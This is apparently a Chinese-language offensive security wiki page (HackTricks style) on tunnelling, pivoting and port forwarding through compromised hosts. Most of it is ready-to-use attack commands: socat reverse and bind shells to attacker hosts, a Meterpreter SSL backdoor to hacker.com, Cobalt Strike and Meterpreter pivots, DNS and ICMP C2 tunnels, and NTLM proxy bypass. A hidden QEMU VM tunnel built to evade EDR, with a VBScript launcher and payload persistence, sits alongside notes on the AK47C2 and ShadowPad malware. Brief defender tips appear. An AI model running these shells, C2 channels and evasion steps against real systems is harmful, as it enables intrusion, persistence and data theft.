# 隧道与端口转发

{{#include ../banners/hacktricks-training.md}}

## Nmap 提示

> [!WARNING]
> **ICMP** 和 **SYN** 扫描无法通过 socks proxies 进行隧道化，因此我们必须 **禁用 ping 探测** (`-Pn`) 并指定 **TCP 扫描** (`-sT`) 才能使其生效。

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 图形连接（X）
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

在 SSH Server 上打开新端口 --> 其他端口
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

本地 port --> 被攻陷的主机 (SSH) --> 第三台主机:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

本地端口 --> 被入侵主机 (SSH) --> 任意目的地
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

这有助于通过 DMZ 从内部主机获取 reverse shells 到你的主机:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

你需要在两个设备上拥有 **root** 权限（因为你将创建新的接口），并且 sshd 配置必须允许 root 登录：\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
在服务器端启用转发
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
在客户端设置新路由
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> 2023 年的 Terrapin 降级攻击可以让中间人篡改早期 SSH 握手并向 **任何转发通道** 注入数据（`-L`, `-R`, `-D`）。在依赖 SSH 隧道之前，确保客户端和服务器都已打补丁（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或在 `sshd_config`/`ssh_config` 中显式禁用易受攻击的 `chacha20-poly1305@openssh.com` 和 `*-etm@openssh.com` 算法。

## SSHUTTLE

你可以通过一台主机使用 **ssh** 将到达某个 **subnetwork** 的所有 **traffic** **tunnel**。\
例如，转发所有发往 10.10.10.0/24 的 traffic
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
使用 private key 连接
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

本地端口 --> 被攻陷主机（活动会话） --> 第三台主机:端口
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
另一种方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

在 teamserver 上打开一个监听所有接口的端口，可用于 **通过 beacon 路由流量**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 在这种情况下，**port is opened in the beacon host**，而不是在 Team Server 上；流量会发送到 Team Server，然后由其转发到指定的 host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
注意：

- Beacon's reverse port forward 旨在 **将流量隧道到 Team Server，而不是在各个机器之间中继**。
- 流量是 **隧道在 Beacon 的 C2 流量内**，包括 P2P 链接。
- 在高端口创建 reverse port forwards **不需要管理员权限**。

### rPort2Port local

> [!WARNING]
> 在这种情况下，**端口是在 beacon host 上打开的**，而不是在 Team Server 上，并且 **流量被发送到 Cobalt Strike client**（而不是发送到 Team Server），然后从那里转发到指定的 host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

你需要上传一个 web 隧道文件：ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

你可以从 releases 页面下载它 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
你需要使用**客户端和服务器端相同的版本**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 端口转发
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**为 agent 和 proxy 使用相同的版本**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### 代理绑定与监听
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 访问 Agent 的本地端口
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

反向隧道。隧道由受害者发起。\
在 127.0.0.1:1080 上创建一个 socks4 proxy。
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
通过 **NTLM proxy** 进行 Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port 通过 socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### 通过 SSL Socat 的 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
你可以在受害者的控制台中执行此行来绕过 **non-authenticated proxy**，替换最后一行：
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

在双方创建证书：Client 和 Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

将本地 SSH 端口 (22) 连接到 attacker 主机的 443 端口
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

它类似于控制台版的 PuTTY（选项与 ssh client 非常相似）。

由于该二进制将在受害者主机上执行，且它是一个 ssh client，我们需要在本机开启 ssh 服务及端口，以便建立 reverse connection。接着，要把仅在本地可访问的端口转发到我们机器上的某个端口：
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

你需要是 local admin (针对任何 port)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

你需要对系统具有 **RDP 访问权限**。\
下载：

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 该工具使用 Windows 的 `Dynamic Virtual Channels` (`DVC`)（来自 Remote Desktop Service 功能）。DVC 负责 **tunneling packets over the RDP connection**。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

在你的客户端计算机上加载 **`SocksOverRDP-Plugin.dll`** 如下：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
现在我们可以通过 **RDP** 使用 **`mstsc.exe`** **连接** 到 **victim**，并且我们应该会收到一个 **提示**，说明 **SocksOverRDP plugin is enabled**，并且它将 **监听** 在 **127.0.0.1:1080**。

通过 **RDP** **连接** 并在 **victim** 机器上上传并执行 `SocksOverRDP-Server.exe` 二进制文件：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
现在，在你的机器（攻击者）上确认端口 1080 是否正在监听:
```
netstat -antb | findstr 1080
```
Now you can use [**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**

## Proxify Windows GUI Apps

你可以使用 [**Proxifier**](https://www.proxifier.com/) 让 Windows GUI 应用通过代理访问网络。\
在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
在 **Profile -> Proxification Rules** 中添加要代理的程序名称，以及要代理的目标 IP 的连接规则。

## NTLM proxy bypass

之前提到的工具：**Rpivot**\
**OpenVPN** 也可以绕过它，通过在配置文件中设置以下选项：
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

它对代理进行身份验证并在本地绑定一个端口，该端口被转发到您指定的外部服务。然后，您可以通过该端口使用您选择的工具。\
例如，它将端口 443 转发
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
现在，例如，如果你在受害者上将 **SSH** 服务设置为监听端口 443。你可以通过攻击者的端口 2222 连接到它。\
你也可以使用一个 **meterpreter** 连接到 localhost:443，而攻击者在端口 2222 上监听。

## YARP

由 Microsoft 创建的反向代理。你可以在这里找到它: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

在两台系统上都需要 Root 权限以创建 tun adapters，并通过 DNS queries 在它们之间隧道传输数据。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
该隧道会非常慢。你可以通过以下命令在该隧道上创建一个压缩的 SSH 连接：
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

通过 DNS 建立 C\&C 通道。它不需要 root 权限。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **在 PowerShell 中**

你可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 powershell 中运行 dnscat2 client:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding with dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 更改 proxychains 的 DNS

Proxychains 会拦截 `gethostbyname` libc 调用并通过 socks proxy 隧道化 tcp DNS 请求。默认情况下 proxychains 使用的 **DNS** 服务器是 **4.2.2.2**（硬编码）。要更改它，编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并修改 IP。如果你处于 **Windows environment**，可以设置 **domain controller** 的 IP。

## Go 中的隧道

https://github.com/hotnops/gtunnel

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor 创建了一个双通道 **C2**（"AK47C2"），仅滥用出站 **DNS** 和纯 **HTTP POST** 流量——这两种协议在企业网络中很少被阻断。

1. **DNS 模式 (AK47DNS)**
• 生成一个随机的 5 字符 SessionID（例如 `H4T14`）。
• 对于 *task requests* 前缀 `1`，对于 *results* 前缀 `2`，并连接不同字段（flags、SessionID、computer name）。
• 每个字段使用 ASCII 密钥 `VHBD@H` 进行 XOR 加密，hex 编码，并用点连接——最后以攻击者控制的域名结尾：

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• 请求使用 `DnsQuery()` 查询 **TXT**（回退为 **MG**）记录。  
• 当响应超过 0xFF 字节时，backdoor 将数据分片为 63 字节块并插入标记：`s<SessionID>t<TOTAL>p<POS>`，以便 C2 服务器可以重新排序它们。

2. **HTTP 模式 (AK47HTTP)**
• 构建一个 JSON 信封：
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 整个数据块先进行 XOR-`VHBD@H` → hex → 作为 **`POST /`** 的 body 发送，header 为 `Content-Type: text/plain`。  
• 回复使用相同编码，`cmd` 字段通过 `cmd.exe /c <command> 2>&1` 执行。

Blue Team notes
• 查找异常的 **TXT queries**：首个标签为长的十六进制串且总是以某个罕见域名结尾。  
• 恒定的 XOR 密钥后跟 ASCII-hex 容易用 YARA 检测：`6?56484244?484`（即 `VHBD@H` 的十六进制表示）。  
• 对于 HTTP，标记那些 body 为纯十六进制且字节数为偶数的 text/plain POST。

{{#note}}
整个通道完全符合 **标准 RFC** 的查询，并将每个子域标签保持在 63 字节以内，使其在大多数 DNS 日志中更加隐蔽。
{{#endnote}}

## ICMP Tunneling

### Hans

https://github.com/friedrich/hans  
https://github.com/albertzak/hanstunnel

两端都需要 Root 权限 来创建 tun adapters，并使用 ICMP echo requests 在它们之间隧道化数据。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**从这里下载**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **是一个可以通过一条命令将服务暴露到互联网的工具。**\
_暴露的 URI 例如：_ **UID.ngrok.io**

### 安装

- 创建一个账户: https://ngrok.com/signup
- 客户端下载：
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本用法

**文档：** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_如果需要，也可以添加 authentication 和 TLS。_

#### TCP 隧道
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### 通过 HTTP 暴露文件
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_对 XSS,SSRF,SSTI 等有用 ..._\
可以直接从 stdout 或在 HTTP 界面 [http://127.0.0.1:4040](http://127.0.0.1:4000) 查看。

#### Tunneling 内部 HTTP 服务
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 简单配置示例

它会打开 3 个隧道：

- 2 个 TCP
- 1 个 HTTP，从 /tmp/httpbin/ 暴露静态文件
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare’s `cloudflared` 守护进程可以创建出站隧道，暴露 **local TCP/UDP services**，无需入站防火墙规则，并使用 Cloudflare’s edge 作为汇合点。当出口防火墙只允许 HTTPS 流量而入站连接被阻止时，这非常有用。

### 快速隧道一行命令
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### 使用 DNS 的持久隧道
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
启动连接器：
```bash
cloudflared tunnel run mytunnel
```
Because all traffic leaves the host **outbound over 443**, Cloudflared 隧道是绕过 ingress ACLs 或 NAT boundaries 的简单方法。注意该二进制通常以提升的权限运行 – 尽可能在可能的情况下使用容器或 `--user` 标志。

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) 是一个持续维护的 Go reverse-proxy，支持 **TCP, UDP, HTTP/S, SOCKS and P2P NAT-hole-punching**。从 **v0.53.0 (May 2024)** 开始，它可以作为一个 **SSH Tunnel Gateway**，因此目标主机可以仅使用系统自带的 OpenSSH 客户端启动反向隧道 – 无需额外二进制。

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 使用新的 SSH 网关（无需 frpc 二进制）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上面的命令将受害者的端口 **8080** 发布为 **attacker_ip:9000**，无需部署任何额外工具 —— 非常适合 living-off-the-land pivoting。

## 使用 QEMU 的隐蔽基于 VM 的隧道

QEMU 的 user-mode networking (`-netdev user`) 支持一个名为 `hostfwd` 的选项，**将 TCP/UDP 端口绑定在 *host* 上并转发到 *guest* 内部**。当 guest 运行完整的 SSH daemon 时，hostfwd 规则会为你提供一个一次性的 SSH jump box，完全存在于短暂的 VM 中 —— 非常适合将 C2 流量对 EDR 隐藏，因为所有恶意活动和文件都停留在虚拟磁盘内。

### 快速一行命令
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上述命令在内存中启动了一个 **Tiny Core Linux** 镜像 (`tc.qcow2`)。  
• Windows 主机上的端口 **2222/tcp** 被透明地转发到虚拟机内部的 **22/tcp**。  
• 在攻击者看来，目标仅暴露端口 2222；任何到达该端口的数据包都会由运行在 VM 中的 SSH 服务器处理。  

### 通过 VBScript 隐蔽启动
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
运行脚本 `cscript.exe //B update.vbs` 可保持窗口隐藏。

### 在虚拟机（guest）内的持久化

因为 Tiny Core 是无状态的，攻击者通常会：

1. 将 payload 放到 `/opt/123.out`
2. 追加到 `/opt/bootlocal.sh`：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，以便在关机时将 payload 打包到 `mydata.tgz`。

### 为什么这能绕过检测

• 只有两个未签名的可执行文件 (`qemu-system-*.exe`) 触及磁盘；没有安装驱动或服务。  
• 主机上的安全产品看到的是 **良性回环流量**（实际的 C2 在 VM 内终止）。  
• 内存扫描器不会分析恶意进程空间，因为它运行在不同的操作系统中。

### 防御者提示

• 对位于用户可写路径中的 **unexpected QEMU/VirtualBox/KVM binaries** 生成告警。  
• 阻止源自 `qemu-system*.exe` 的出站连接。  
• 搜索在 QEMU 启动后立即绑定的罕见监听端口（2222、10022、…）。

## 通过 `HttpAddUrl` 的 IIS/HTTP.sys 转发节点 (ShadowPad)

Ink Dragon 的 ShadowPad IIS 模块通过在 HTTP.sys 层直接绑定隐蔽的 URL 前缀，将每个被攻破的外围 Web 服务器变为双重用途的 **backdoor + relay**：

* **Config defaults** – 如果该模块的 JSON 配置省略某些值，它会回退到看似合理的 IIS 默认值 (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`)。这样 IIS 会以正确的品牌标识响应良性流量。
* **Wildcard interception** – 操作者提供一个以分号分隔的 URL 前缀列表（host + path 中可使用通配符）。模块对每一项调用 `HttpAddUrl`，因此 HTTP.sys 会在请求到达 IIS 模块之前将匹配的请求路由到恶意处理程序。
* **Encrypted first packet** – 请求体的前两个字节包含自定义 32 位 PRNG 的种子。协议解析前，每个后续字节都会用生成的密钥流做 XOR：

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – 模块维护两个列表："servers"（上游节点）和 "clients"（下游 implants）。如果大约 30 秒内没有心跳到达，条目会被裁剪。当两个列表均非空时，它会将第一个健康的 server 与第一个健康的 client 配对，并在其套接字之间直接传输字节，直到一方关闭。
* **Debug telemetry** – 可选日志记录每次配对的源 IP、目标 IP 及转发总字节数。调查人员利用这些线索重建了跨多个受害者的 ShadowPad 网状网络。

---

## 其他可检查的工具

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## 参考资料

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
